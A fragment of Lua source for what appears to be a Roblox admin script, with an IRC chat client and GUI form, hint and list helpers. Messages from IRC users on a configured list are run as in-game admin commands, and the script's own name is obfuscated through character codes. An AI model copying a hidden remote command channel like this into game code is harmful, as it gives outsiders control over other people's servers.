		if Data and #Data > 0 then
			IRC:HandleResponse(REMOTE:Decode(Data))
		end
		wait(2) -- Don't spam the server
	end
	if not Data then
		IRC:AddChat("[ CLIENT ]", "Could not get data", true)
	end
	if Stop == true then
		IRC:AddChat("[ CLIENT ]", "Disconnected from session", true)
	end
end

function IRC:ConnectToServer(Server)
	if Connected then
		if not IRC.Servers[Server] then
			IRC:AddChat("[ CLIENT ]", "Cannot connect to "..Server, true)
			return false
		end
		IRC:Quit("New Connection")
	end
	local Response = IRC:Connect()
	if not Response then IRC:AddChat("[ CLIENT ]", "Unable to connect!", true) return false end
	local Data = REMOTE:Decode(Response)
	IRC.SessionID = Data[2]
	wait(1)
	if not tostring(IRC.SessionID) or IRC.SessionID == "?" then
		IRC:AddChat("[ IRC ]", "Session ID is invalid, reconnecting...")
		IRC:Quit()
		IRC:ConnectToServer(Server)
	end
	IRC.Connected = true
	IRC:Join(Settings.IRCChannel)
	IRC:ReceiveData()
	IRC.Connected = false
	IRC:AddChat("[ CLIENT ]", "Session ended", true)
end

function IRC:FindUser(UserName)
	for UserID,User in pairs(IRC.Users) do
		if string.lower(User) == string.lower(UserName) then
			return UserID
		end
	end
	return nil
end

function IRC:HandleResponse(Data)
	if type(Data) ~= "table" then
		IRC:AddChat("[ CLIENT ]", "Unable to handle data (Not table)", true)
		ypcall(function()
			IRC:AddChat("[ CLIENT ]", "Data: "..tostring(Data), true)
		end)
		return false
	end
	for _,Output in pairs(Data) do
		if type(Output) == "table" and Output[2] then
			local ID = string.upper(Output[2])
			if not IRC.Ignore[ID] then
				if ID == "PING" then
					IRC:Pong(Output[4][1])
				elseif ID == "PRIVMSG" then
					local SenderDetails = Output[3]
					local Sender = string.sub(SenderDetails,1,string.find(SenderDetails, "!")-1)
					local Channel = string.lower(Output[4][1])
					if Channel == IRC.NickName then
						Channel = Sender
						-- TODO: Handle PM's
					end
					local Message = Output[4][2]
					if Message ~= nil then
						if string.sub(Sender,1,3) == "rbx" and string.find(Sender, "_") then -- detects bots
							if string.find(Message,":") then
								local IRCUser = string.sub(Message,1,string.find(Message,":")-1)
								local IRCMessage = string.sub(Message,string.find(Message,":")+1, #Message)
								IRC:AddChat(IRCUser, IRCMessage)
							end
						else
							IRC:AddChat("[ IRC ] "..Sender,Message)
							for _,Name in pairs(Settings.IRCCommandExecuters) do
								if string.lower(Name) == string.lower(Sender) then
									CORE:Chatted(Message, nil, false, "[IRC]: "..Sender, nil, true)
									break
								end
							end
						end
					else
						IRC:AddChat("[ CLIENT ]", "Message became nil for some reason")
					end
				elseif ID == "NICK" then
					local Name = string.sub(Output[3],1,string.find(Output[3],"!")-1)
					-- change nickname?
				elseif ID == "433" or ID == "451" then
					IRC:AddChat("[ IRC ]", "Nickname already in use, rejoining with new one")
					IRC:Quit("Nickname in use, rejoining with new name")
					IRC.NickName = IRC:GenerateName()
					wait(2) -- wait for old sessions to end
					IRC:ConnectToServer(Settings.IRCServer)
				elseif ID == "353" then
					if Data[4][4][4] then
						for Output in string.gmatch(Data[4][4][4], "[^%s]+") do
							table.insert(IRC.Users, Output)
						end
					end
				elseif ID == "QUIT" or ID == "PART" then
					for User in string.gmatch(Data[1][3], "[^!~]+") do
						if IRC:FindUser(User) then
							IRC:AddChat("[ IRC ]", User.." has left")
							table.remove(IRC.Users, IRC:FindUser(User))
						end
					end
				elseif ID == "JOIN" then
					for User in string.gmatch(Data[1][3], "[^!~]+") do
						if not string.find(User, "qwebirc") then
							IRC:AddChat("[ IRC ]", User.." has joined")
							table.insert(IRC.Users,w)
						end
					end
				elseif ID == "CONNECTION TO IRC SERVER LOST." then
					IRC:AddChat("[ CLIENT ]", "Cannot connect to IRC. Connection lost")
					--IRC:Quit("Connection lost")
					--IRC:AddChat("[ CLIENT ]", "Retrying connection")
					--IRC:ConnectToServer(Settings.IRCServer)
				elseif IRC.Codes[ID] then
					--print(ID)
					--print(Data[i][4][2])
					--print(Data[i][4][2])
				elseif ID == "KICK" then
					IRC:AddChat("[ CLIENT ]", "You have been kicked from IRC")
					IRC:Quit("Kicked from IRC")
				elseif ID then
					IRC:AddChat("[ CLIENT ]", "Unknown data (ID: "..ID..")", true)
				else
					IRC:AddChat("[ CLIENT ]", "Unknown data with invalid ID", true)
				end
			end
		else
			if Output == false then return false end -- sneeky server
			IRC:AddChat("[ CLIENT ]", "Unable to handle data")
		end
	end
end

-- GUI functions --

function GUI:GetColor(ColorName)
	if not ColorName then ColorName = Settings.ColorScheme end
	return Colors[string.upper(ColorName)]
end

function GUI:ContrastColor(Color)
	if type(Color) == "string" then Color = GUI:GetColor(Color) end
	if not Color then Color = GUI:GetColor() end
	return Color3.new(math.abs(Color.r-1),math.abs(Color.g-1),math.abs(Color.b-1))
end


function GUI:GetNameColor(Name)
	local Val = 0
	for i = 1, #Name do 
		local CVal = string.byte(string.sub(Name, i, i))
		local RevIndex = #Name - i + 1
		if #Name%2 == 1 then 
			RevIndex = RevIndex - 1			
		end
		if RevIndex%4 >= 2 then 
			CVal = -CVal 			
		end 
		Val = Val + CVal 
	end 
	local Index = Val%8 + 1
	
	return BrickColor.new(ChatColors[Index])
end

function GUI:Color3ToHex(Color)
	local function ConvertNumber(Number)
		local HexString = "0123456789abcdef"
		local Byte = ""
		while Number > 0 do
			local Calc = math.fmod(Number, 16)
			Byte = string.sub(HexString, Calc+1, Calc+1)..Byte
			Number = math.floor(Number / 16)
		end
		if Calc == "" then
			Byte = "00"
		elseif #Byte == 1 then
			Byte = "0"..Byte
		elseif Byte == "" then
			Byte = "00"
		end
		return Byte
	end
	return ConvertNumber(Color.r * 255)..ConvertNumber(Color.g * 255)..ConvertNumber(Color.b * 255)
end

function GUI:CreateForm(Player, TitleText, Size, Position, IconID, ShowFormButtons, ColorScheme, TransparencyScheme, AutoOffset, TweenPosition, NoModal, NoScrollFrame)
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	local TaskBar = Player.PlayerGui:FindFirstChild("M".."ake".."rMod".."el".."Lua's TaskBar")
	if not TitleText then TitleText = "Unknown" end
	if not Size then Size = UDim2.new(0.5,0,0.5,0) end
	if not Position then Position = UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,0.5-(Size.Y.Scale/2),-Size.Y.Offset/2) end
	if not IconID then IconID = 19919809 end
	if ShowFormButtons == nil then ShowFormButtons = true end
	if not ColorScheme then ColorScheme = Settings.ColorScheme end
	if not TransparencyScheme then TransparencyScheme = Settings.TransparencyScheme end
	if AutoOffset == nil then AutoOffset = true end
	if Icons[IconID] then IconID = Icons[IconID] end
	if TweenPosition == nil then TweenPosition = true end
	if NoModal == nil then NoModal = false end
	if NoScrollFrame == nil then NoScrollFrame = false end
	
	local IsClosed = false
	local Minus = nil
	local Offset = 0
	local ContentType = "ScrollingFrame"
	local TweenSpeed = 0.3
	
	if AutoOffset then
		for _,Item in pairs(Player.PlayerGui:GetChildren()) do
			if Item.Name == "M".."a".."k".."erModelLua's Admin Form" then
				if Item.IsActive.Value == true then
					if Item.IsTrueForm.Value == true then
						Offset = Offset + 50
					end
				end
			end
		end
	end
	
	if NoScrollFrame == true then
		ContentType = "Frame"
	end
	
	SOUND:PlayNotification(Player, 155331654)
	
	local Position = Position + UDim2.new(0,Offset,0,Offset)
	local MinimizePos = Position
	
	local SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = string.char(76 + 1, 97, 107, 10 ^ 2 + 1, 114, 77, 111, 10 ^ 2, 101, 108, 76, 117, 97, 39, 115).." Admin Form"
	local IsActive = Instance.new("BoolValue", SG) IsActive.Name = "IsActive" IsActive.Value = true
	local IsTrueForm = Instance.new("BoolValue", SG) IsTrueForm.Name = "IsTrueForm" IsTrueForm.Value = ShowFormButtons
	
	local Dragger = Instance.new("Frame", SG) Dragger.Name = "Dragger" Dragger.Position = UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,-Size.Y.Scale,-Size.Y.Offset - 90) Dragger.Size = Size + UDim2.new(0, 0, 0, 40) Dragger.BackgroundColor3 = GUI:GetColor(ColorScheme) Dragger.BorderColor3 = GUI:ContrastColor(ColorScheme) Dragger.BorderSizePixel = 2 Dragger.BackgroundTransparency = 0.9 Dragger.Active = true Dragger.ClipsDescendants = true Dragger.Draggable = true
	local FormBar = Instance.new("Frame", Dragger) FormBar.Name = "FormBar" FormBar.Position = UDim2.new(0, 0, 0, 0) FormBar.Size = UDim2.new(1, 0, 0, 40) FormBar.BackgroundTransparency = 1
	local Splitter = Instance.new("Frame", Dragger) Splitter.Name = "Splitter" Splitter.Position = UDim2.new(0, 0, 0, 35) Splitter.Size = UDim2.new(1, 0, 0, 2) Splitter.BackgroundColor3 = GUI:ContrastColor(ColorScheme) Splitter.BorderColor3 = GUI:ContrastColor(ColorScheme)
	local X = Instance.new("ImageButton", FormBar) X.Name = "X" X.Position = UDim2.new(1, -30, 0, 5) X.Size = UDim2.new(0, 25, 0, 25) X.BackgroundTransparency = 1 X.Image = "rbxassetid://275572394"
	local IconHolder = Instance.new("ImageLabel", FormBar) IconHolder.Name = "IconHolder" IconHolder.Position = UDim2.new(0, 5, 0, 5) IconHolder.Size = UDim2.new(0, 35, 0, 25) IconHolder.BackgroundTransparency = 1 IconHolder.Image = "rbxassetid://276002222"
	local Icon = Instance.new("ImageLabel", IconHolder) Icon.Name = "Icon" Icon.Position = UDim2.new(0, 3, 0.5, -10) Icon.Size = UDim2.new(0, 20, 0, 20) Icon.BackgroundTransparency = 1 Icon.Image = "rbxassetid://"..IconID  
	local TitleBegin = Instance.new("ImageLabel", FormBar) TitleBegin.Name = "TitleBegin" TitleBegin.Position = UDim2.new(0, 30, 0, 5) TitleBegin.Size = UDim2.new(0, 35, 0, 25) TitleBegin.BackgroundColor3 = Color3.new(1, 1, 1) TitleBegin.BackgroundTransparency = 1 TitleBegin.Image = "rbxassetid://275589160"
	local TitleEnd = Instance.new("ImageLabel", FormBar) TitleEnd.Name = "TitleEnd" TitleEnd.Position = UDim2.new(1, -76, 0, 5) TitleEnd.Size = UDim2.new(0, 25, 0, 25) TitleEnd.BackgroundTransparency = 1 TitleEnd.Image = "rbxassetid://275589154" 
	local Title = Instance.new("TextLabel", FormBar) Title.Name = "Title" Title.Position = UDim2.new(0, 50, 0, 5) Title.Size = UDim2.new(1, -120, 0, 25) Title.BackgroundColor3 = Color3.new(101/255, 102/255, 102/255) Title.BorderSizePixel = 0 Title.Text = TitleText Title.Font = "ArialBold" Title.FontSize = "Size18" Title.TextXAlignment = "Left" Title.TextColor3 = GUI:ContrastColor(ColorScheme) Title.ClipsDescendants = true
	
	local Body = Instance.new("TextButton", Dragger) Body.Name = "Body" Body.Position = UDim2.new(0, 0, 0, 40) Body.Size = UDim2.new(1, 0, 1, -40) Body.BackgroundColor3 = Color3.new(1, 1, 1) Body.BackgroundTransparency = 1 Body.Text = "" Body.Modal = true Body.Active = true Body.Modal = not NoModal
	local Content = Instance.new(ContentType, Body) Content.Name = "Content" Content.Size = UDim2.new(1, 0, 1, 0) Content.BackgroundTransparency = 1
	if ContentType == "ScrollingFrame" then Content.CanvasSize = Size end
	--local ResizeContainer = Instance.new("Frame", SG) ResizeContainer.Name = "ResizeContainer" ResizeContainer.Size = UDim2.new(0, 20, 0, 20) ResizeContainer.BackgroundColor3 = Color3.new(1, 1, 1) ResizeContainer.BackgroundTransparency = 1
	--local Resizer = Instance.new("ImageLabel", ResizeContainer) Resizer.Name = "Resizer" Resizer.Size = UDim2.new(1, 0, 1, 0) Resizer.BackgroundColor3 = Color:GetColor() Resizer.BackgroundTransparency = Settings.TransparencyScheme Resizer.BorderSizePixel = 0 Resizer.Image = "rbxassetid://199287674" Resizer.Active = true Resizer.Draggable = true  
	
	CORE:ExecuteResource("GUIEffect", SG, {["Transparency"] = Settings.TransparencyScheme + 0.1, ["GUIName"] = "Dragger"})
	
	local Functions = Instance.new("Folder", SG) Functions.Name = "Functions"
	
	local Close = Instance.new("BindableFunction", Functions) Close.Name = "Close"
	local Closed = Instance.new("BindableEvent", Functions) Closed.Name = "Closed"
	local Minimize = Instance.new("BindableFunction", Functions) Minimize.Name = "Minimize"
	local Minimized = Instance.new("BindableEvent", Functions) Minimized.Name = "Minimized"
	local Restore = Instance.new("BindableFunction", Functions) Restore.Name = "Restore"
	local Restored = Instance.new("BindableEvent", Functions) Restored.Name = "Restored"
	
	if Settings.EnableTaskBar then
		Minus = Instance.new("ImageButton", FormBar) Minus.Name = "Minus" Minus.Position = UDim2.new(1, -58, 0, 5) Minus.Size = UDim2.new(0, 35, 0, 25) Minus.BackgroundTransparency = 1 Minus.Image = "rbxassetid://275589157"
	else
		TitleEnd.Position = UDim2.new(1, -50, 0, 5)
		Title.Size = UDim2.new(1, -95, 0, 25)
	end
	
	if not ShowFormButtons then
		X:Destroy()
		TitleEnd:Destroy()
		Title.Size = UDim2.new(1, -55, 0, 25)
	end
	
	local function CloseForm()
		if IsClosed == false then
			IsActive.Value = false
			IsClosed = true
			ypcall(function() Dragger:TweenPosition(UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,1,Size.Y.Offset + 20), "Out", "Quint", TweenSpeed, true, function() wait(1) if SG then SG:Destroy() end end) end)
			Closed:Fire()
			SOUND:PlayNotification(Player, 206375138)
		end
	end
	
	local function MinimizeForm()
		if IsActive.Value == true then
			IsActive.Value = false
			Minimized:Fire()
			MinimizePos = Dragger.Position
			ypcall(function() Dragger:TweenPosition(UDim2.new(0.5-(Size.X.Scale/2),-Size.X.Offset/2,-Size.Y.Scale,-Size.Y.Offset - 90), "Out", "Quad", TweenSpeed, true) end)
		end
	end
	
	local function RestoreForm()
		if IsActive.Value == false then
			IsActive.Value = true
			Restored:Fire()
			ypcall(function() Dragger:TweenPosition(MinimizePos, "Out", "Quint", TweenSpeed, true) end)
		end
	end
	
	if X then CORE:HandleEvent(X, "MouseButton1Down", CloseForm) end
	if Minus then CORE:HandleEvent(Minus, "MouseButton1Down", MinimizeForm) end
	
	Close.OnInvoke = CloseForm
	Minimize.OnInvoke = MinimizeForm
	Restore.OnInvoke = RestoreForm
	
	if TweenPosition then Dragger:TweenPosition(Position, "Out", "Quint", TweenSpeed, true) end
	
	if TaskBar then
		TaskBar:WaitForChild("AddForm")
		TaskBar.AddForm:Fire(SG, IconID, Closed, Minimized, Restore)
	end
	
	return Content, Close, Closed, Minimize, Minimized, Restore, Restored
end

function GUI:CoreGui(Player, Type, Enable)
	local Parent = Player:FindFirstChild("Backpack")
	if not Parent then Parent = Player.Backpack end
	CORE:ExecuteResource("CoreGui", Player.Character, {["Type"] = Type, ["Enabled"] = Enable})
end

function GUI:SendMessage(Player, TitleText, BodyText, IconID, Time, AutoTime, Speaker)
	if not Player or not Player:IsA("Player") then return nil end
	if BodyText == "" then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	
	local MessageSplit = STRING:GetSplit(BodyText, 1, " ") or {BodyText}
	local TextColor = GUI:GetColor(MessageSplit[1])
	if TextColor then BodyText = MessageSplit[2] end
	BodyText = string.sub(STRING:FormatReplace(Player, BodyText, Speaker or Player),1,1000)
	
	local Frame, Close, Closed, _, Minimized = GUI:CreateForm(Player, TitleText, UDim2.new(0.2,100,0.1,100), nil, IconID)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1,0,1,0) Body.BackgroundTransparency = 1 Body.Text = BodyText Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextStrokeTransparency = 0 Body.TextWrapped = true Body.TextYAlignment = "Top"
	
	if Frame then
		local FormBar = Frame.Parent.Parent.FormBar
		local Said = false
		local Speak = Instance.new("ImageButton", FormBar) Speak.Name = "Speak" Speak.Position = UDim2.new(1, -87, 0, 5) Speak.Size = UDim2.new(0, 35, 0, 25) Speak.BackgroundColor3 = Color3.new(1, 1, 1) Speak.BackgroundTransparency = 1 Speak.Image = "rbxassetid://276195369"
		if Settings.EnableTaskBar then
			FormBar.TitleEnd.Position = UDim2.new(1, -106, 0, 5)
			FormBar.Title.Size = UDim2.new(1, -145, 0, 25)
		else
			Speak.Position = UDim2.new(1, -58, 0, 5)
			FormBar.TitleEnd.Position = UDim2.new(1, -76, 0, 5)
			FormBar.Title.Size = UDim2.new(1, -120, 0, 25)
		end
		CORE:HandleEvent(Speak, "MouseButton1Down", function()
			if not Said then
				Said = true
				SOUND:SayConvertedText(SOUND:ConvertText(BodyText), Frame)
			end
		end)
		
		if TextColor then
			Body.TextColor3 = TextColor
		else
			Body.TextColor3 = Color3.new(1,1,1)
		end
		
		if tonumber(Time) then coroutine.wrap(function()
			if AutoTime then
				Time = Time + math.floor(#BodyText/7)
			end
			local Alive = true
			
			local function StopTimer() Alive = false end
			Closed.Event:connect(StopTimer)
			Minimized.Event:connect(StopTimer)
			
			Frame.Size = Frame.Size + UDim2.new(0,0,0,-30)
			Frame.Position = Frame.Position + UDim2.new(0,0,0,30)
			local Ticker = Instance.new("TextLabel", Frame.Parent) Ticker.Size = UDim2.new(1, 0, 0, 30) Ticker.TextColor3 = GUI:ContrastColor() Ticker.BackgroundTransparency = 1 Ticker.Text = Time Ticker.Font = "ArialBold" Ticker.FontSize = "Size18"
			local Stop = Instance.new("ImageButton", Frame.Parent) Stop.Name = "Stop" Stop.Position = UDim2.new(1,-30,0,0) Stop.Size = UDim2.new(0, 25, 0, 25) Stop.BackgroundColor3 = Color3.new(1, 1, 1) Stop.BackgroundTransparency = 1 Stop.Image = "rbxassetid://49494354"
			CORE:HandleEvent(Stop, "MouseButton1Down", StopTimer)
			for i = Time,0,-1 do
				for ii = 1,10 do
					if Alive == true then
						Ticker.Text = i
						wait(0.1)
					else
						break
					end
				end
			end
			if Alive == true then
				Close:Invoke()
			else
				Ticker:Destroy()
				Stop:Destroy()
				Frame.Size = Frame.Size + UDim2.new(0,0,0,30)
				Frame.Position = Frame.Position + UDim2.new(0,0,0,-30)
			end
		end)() end
		
		CORE:ExecuteResource("CalculateScrollY", Body)
	end
end

function GUI:FullMessage(Player, TitleText, BodyText, IconID, Error)
	if not Player then return nil end
	if not Player:IsA("Player") then return nil end
	if BodyText == "" then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	BodyText = string.sub(STRING:FormatReplace(Player, BodyText),1,1000)
	local TextColor = GUI:ContrastColor()
	if Error then TextColor = Color3.new(1,0,0) end
	
	local Frame, Close, Closed, Minimize, Minimized = GUI:CreateForm(Player, TitleText, UDim2.new(0.3,0,0.3,0), nil, IconID)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1, -13, 1, 0) Body.BackgroundTransparency = 1 Body.Text = BodyText Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextStrokeTransparency = 1 Body.TextWrapped = true Body.TextXAlignment = "Left" Body.TextYAlignment = "Top" Body.TextColor3 = TextColor
	
	CORE:ExecuteResource("CalculateScrollY", Body)
	
	return Frame, Close, Closed, Minimize, Minimized
end

function GUI:SendHint(Player, Text, Time, Speaker) coroutine.wrap(function()
	Text = STRING:FormatReplace(Player, string.sub(Text,1,100), Speaker)
	local TweenTime = 0.5
	if not Time then Time = 5 end
	local SG = Instance.new("ScreenGui") SG.Name = "LuaMod".."".."elM".."aker's Admin Hint"
	local MaxPos = -1
	for _,SGObj in pairs(Player.PlayerGui:GetChildren()) do
		local IVal = SGObj:FindFirstChild("Index")
		if IVal then
			MaxPos = math.max(MaxPos, IVal.Value)
		end
	end
	MaxPos = MaxPos + 1
	local IndexVal = Instance.new("IntValue", SG) IndexVal.Name = "Index" IndexVal.Value = MaxPos
	local Main = Instance.new("Frame", SG) Main.Name = "Main" Main.Position = UDim2.new(0, 0, 0.05, MaxPos * 50) Main.Size = UDim2.new(1, 0, 0, 40) Main.BackgroundTransparency = 1
	local LeftBar = Instance.new("Frame", Main) LeftBar.Name = "LeftBar" LeftBar.Position = UDim2.new(0.5, 0, 0, 0) LeftBar.Size = UDim2.new(0, 0, 1, 0) LeftBar.BackgroundColor3 = GUI:GetColor() LeftBar.BackgroundTransparency = 0.9 LeftBar.BorderSizePixel = 0
	local RightBar = Instance.new("Frame", Main) RightBar.Name = "RightBar" RightBar.Position = UDim2.new(0.5, 0, 0, 0) RightBar.Size = UDim2.new(0, 0, 1, 0) RightBar.BackgroundColor3 = GUI:GetColor() RightBar.BackgroundTransparency = 0.9 RightBar.BorderSizePixel = 0
	local Body = Instance.new("TextLabel", Main) Body.Name = "Body" Body.Size = UDim2.new(1, 0, 1, 0) Body.BackgroundColor3 = Color3.new(1, 1, 1) Body.BackgroundTransparency = 1 Body.TextColor3 = GUI:ContrastColor() Body.Text = Text Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextTransparency = 1
	SG.Parent = Player.PlayerGui
	
	CORE:ExecuteResource("GUIEffect", Main, {["Transparency"] = Settings.TransparencyScheme + 0.1, ["GUIName"] = "LeftBar"})
	CORE:ExecuteResource("GUIEffect", Main, {["Transparency"] = Settings.TransparencyScheme + 0.1, ["GUIName"] = "RightBar"})

	LeftBar:TweenSize(UDim2.new(-0.5, 0, 1, 0), "In", "Quart", TweenTime)
	RightBar:TweenSize(UDim2.new(0.5, 0, 1, 0), "In", "Quart", TweenTime)
	Delay(TweenTime, function()
		for i = 1,0,-0.1 do
			Body.TextTransparency = i
			wait()
		end
		Body.TextTransparency = 0
	end)
	Delay(TweenTime + Time, function()
		for i = 0,1,0.1 do
			Body.TextTransparency = i
			wait()
		end
		Body.TextTransparency = 1
		local Done = false
		LeftBar:TweenSize(UDim2.new(0, 0, 1, 0), "Out", "Quad", TweenTime, true, function() Done = true end)
		RightBar:TweenSize(UDim2.new(0, 0, 1, 0), "Out", "Quad", TweenTime, true, function() repeat wait() until Done SG:Destroy() end)
	end)

end)() end

function GUI:ListGui(Player, Title, List, IconID, Clickable, AutoNumber, PreSearch, BackgroundColor)
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	if not PreSearch then PreSearch = "" end
	if AutoNumber == nil then AutoNumber = true end
	
	local Frame, Close, Closed, Minimize, Minimized = GUI:CreateForm(Player, Title, UDim2.new(0.4,0,0.6,0), nil, IconID, true, BackgroundColor)
	local SearchBar = Instance.new("TextBox") SearchBar.Name = "SearchBar" SearchBar.Position = UDim2.new(0.1,0,0,5) SearchBar.Size = UDim2.new(0.8,0,0,20) SearchBar.BackgroundColor3 = GUI:GetColor() SearchBar.BackgroundTransparency = 0.5 SearchBar.Text = "" SearchBar.Font = Settings.Font SearchBar.FontSize = "Size14" SearchBar.TextColor3 = GUI:ContrastColor() SearchBar.ClearTextOnFocus = false SearchBar.Text = PreSearch SearchBar.Font = Settings.Font SearchBar.FontSize = "Size14"
	SearchBar.Parent = Frame.Parent
	Frame.Size = Frame.Size + UDim2.new(0,0,0,-30)
	Frame.Position = Frame.Position + UDim2.new(0,0,0,30)
	
	local SearchVer = 0,nil
	local Clicked = Instance.new("BindableEvent", Frame) Clicked.Name = "Clicked"
	local RequestDialog = Instance.new("BindableFunction", Frame) RequestDialog.Name = "RequestDialog"
	local InDialog = false
	
	local function ShowResults(Key)
		SearchVer = SearchVer + 1
		local ThisSearchVer = SearchVer
		
		if type(ScrollScript) == "userdata" then ScrollScript.Disabled = true ScrollScript:Destroy() end
		for _,Get in pairs(Frame:GetChildren()) do if Get:IsA("LocalScript") then Get.Disabled = true end Get:Destroy() end
	
		local NumPos,Num = 0,1
		
		for _,Data in pairs(List) do
			if ThisSearchVer ~= SearchVer then
				break
			end
			local String = tostring(Data)--STRING:DetermineFilter(tostring(Data), Player, Player)
			if String then
				local ImageIcon = nil
				if type(Data) == "table" then
					String = Data[1]
					ImageIcon = Data[2]
				end
			
				local TextColor = GUI:ContrastColor()
				local StringSplit = STRING:GetSplit(String, 1, " ")
				local NewColor = GUI:GetColor(StringSplit[1])
				if NewColor then TextColor = NewColor String = StringSplit[2] end
				
				if string.find(string.lower(String), string.lower(Key)) then
					Spacer = false
					local Font = Settings.Font
					local Split = STRING:GetSplit(String, 1, " ")
					if string.sub(string.lower(String),1,6) == "bold: " then
						Font = "ArialBold"
						String = string.sub(String,7)
					elseif Fonts[Split[1]] then
						Font = Split[1]
						String = Split[2]
					end
					if string.sub(String,1,2) == "--" then
						Spacer = true
					end
					local Content = Instance.new("TextButton", Frame) Content.Name = "Content: "..Num Content.Position = UDim2.new(0,0,0,NumPos) Content.Size = UDim2.new(1,0,0,30) Content.BackgroundColor3 = Color3.new(1,1,1) Content.BackgroundTransparency = 0.9 Content.Font = Font Content.FontSize = "Size18" Content.TextXAlignment = "Left" Content.TextColor3 = TextColor if Spacer then Content.Text = string.rep(" ", #tostring(Num) + 3)..String elseif AutoNumber == true then Content.Text = Num..".) "..String else Content.Text = String end
					if ImageIcon then
						if tonumber(ImageIcon) then
							ImageIcon = "rbxassetid://"..ImageIcon
						elseif Icons[ImageIcon] then
							ImageIcon = "rbxassetid://"..Icons[ImageIcon]
						end
						
						Content.Size = UDim2.new(1,0,0,90) Content.Position = UDim2.new(0,0,0,NumPos) Content.ZIndex = 2
						local Image = Instance.new("ImageLabel", Content) Image.Name = "Image" Image.Size = UDim2.new(0, 90, 0, 90) Image.BackgroundColor3 = Color3.new(1, 1, 1) Image.BackgroundTransparency = 1 Image.Image = ImageIcon
						local TextContent = Instance.new("TextLabel", Content) TextContent.Name = "TextContent" TextContent.Position = UDim2.new(0, 90, 0, 0) TextContent.Size = UDim2.new(1, -90, 1, 0) TextContent.BackgroundColor3 = Color3.new(1, 1, 1) TextContent.BackgroundTransparency = 1 TextContent.Text = Content.Text TextContent.Font = Settings.Font TextContent.FontSize = "Size18" TextContent.TextXAlignment = "Left" TextContent.TextColor3 = TextColor TextContent.TextWrapped = true
						Content.Text = ""
						NumPos = NumPos + 90
					else
						NumPos = NumPos + 30
					end
					
					if not Clickable then
						Content.AutoButtonColor = false
						Content.Active = false
						Content.BackgroundTransparency = 1
					elseif ClientInfo[Player.Name] and not ClientInfo[Player.Name].TouchScreen then
						SOUND:BindButton(Content)
						CORE:HandleEvent(Content, "MouseButton1Down", function()
							if not InDialog then
								Clicked:Fire(String)
							end
						end, true)
					end
					if Spacer == false then Num = Num + 1 end
				end
			end
		end
		Frame.CanvasSize = UDim2.new(0,0,0,NumPos)
		ScrollScript = CORE:ExecuteResource("ScrollLeftRight", Frame.Parent, {["VerticalOffset"] = NumPos})
	end
	
	RequestDialog.OnInvoke = function(RequestDialogCall)
		InDialog = RequestDialogCall
	end
	
	ShowResults(PreSearch)
	
	local RPR = CORE:CreateRemotePropertyReader(SearchBar)
	CORE:HandleEvent(SearchBar, "Changed", function(Prop)
		if Prop == "Text" then
			local Text = CORE:ReadProperty(RPR, Player, "Text")
			ShowResults(Text)
			Frame.CanvasPosition = Vector2.new(0,0)
		end
	end)
	
	return Clicked, RequestDialog, Close
end

function GUI:PropertyGui(Player, Title, Icon, Properties)
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end
	if type(Properties) ~= "table" then return nil end
	local HasClosed = false
	local NewProperties = {}
	
	local Frame, _, Closed = GUI:CreateForm(Player, Title, UDim2.new(0.2, 50, 0.5, 50), nil, Icon)
	Frame.ClipsDescendants = true
	local Splitter = Instance.new("Frame", Frame) Splitter.Name = "Splitter" Splitter.Position = UDim2.new(0.5, 0, 0, 0) Splitter.Size = UDim2.new(0, 0, 1, 0) Splitter.BackgroundColor3 = GUI:ContrastColor() Splitter.BorderColor3 = GUI:ContrastColor() Splitter.BorderSizePixel = 2 Splitter.ZIndex = 2
	
	for PropertyName,Data in pairs(Properties) do
		NewProperties[PropertyName] = Data[1]
	end
	
	local YCount = 0
	
	for PropertyName,Data in pairs(Properties) do
		if type(Data) == "table" then
			local DefaultValue = Data[1]
			local Writable = Data[2]
			local ValueType = Data[3]
			
			if Writable == nil then Writable = false end
			if type(ValueType) == "string" then -- now this is confusing
				ValueType = string.lower(ValueType)
			elseif ValueType == nil then
				ValueType = type(DefaultValue)
			end
			
			if ValueType == "nil" or ValueType == "userdata" then
				ValueType = nil
			elseif ValueType == "table" then
				DefaultValue = STRING:UnpackArgs(DefaultValue)
				ValueType = "string"
			end
			
			if ValueType then
				local Object = Instance.new("Frame", Frame) Object.Name = "Object" Object.Size = UDim2.new(1, 0, 0, 50) Object.Position = UDim2.new(0,0,0,YCount) Object.BackgroundColor3 = GUI:GetColor() Object.BackgroundTransparency = 1--Settings.TransparencyScheme
				local Property = Instance.new("TextLabel", Object) Property.Name = "Property" Property.Size = UDim2.new(0.5, 0, 0, 50) Property.BackgroundTransparency = 1 Property.Text = PropertyName Property.Font = Settings.Font Property.FontSize = "Size14" Property.TextWrapped = true Property.TextXAlignment = "Left"
				local ValFrame = Instance.new("Frame", Object) ValFrame.Name = "ValFrame" ValFrame.Position = UDim2.new(0.5, 5, 0, 0) ValFrame.Size = UDim2.new(0.5, -5, 1, 0) ValFrame.BackgroundTransparency = 1
				
				if ValueType == "string" or ValueType == "number" then
					if Writable == true then
						local Input = Instance.new("TextBox", ValFrame) Input.Name = "Input" Input.Position = UDim2.new(0, 0, 0.1, 0) Input.BackgroundTransparency = 1 Input.Size = UDim2.new(1, 0, 0.8, 0) Input.Text = tostring(DefaultValue) Input.Font = Settings.Font Input.FontSize = "Size14" Input.TextWrapped = true Input.TextXAlignment = "Left" Input.ClearTextOnFocus = false
						CORE:HandleEvent(Input, "Changed", function(Prop) if Prop == "Text" then
							if ValueType == "number" then
								NewProperties[PropertyName] = tonumber(Input.Text)
							else
								NewProperties[PropertyName] = tostring(Input.Text)
							end
						end end)
					else
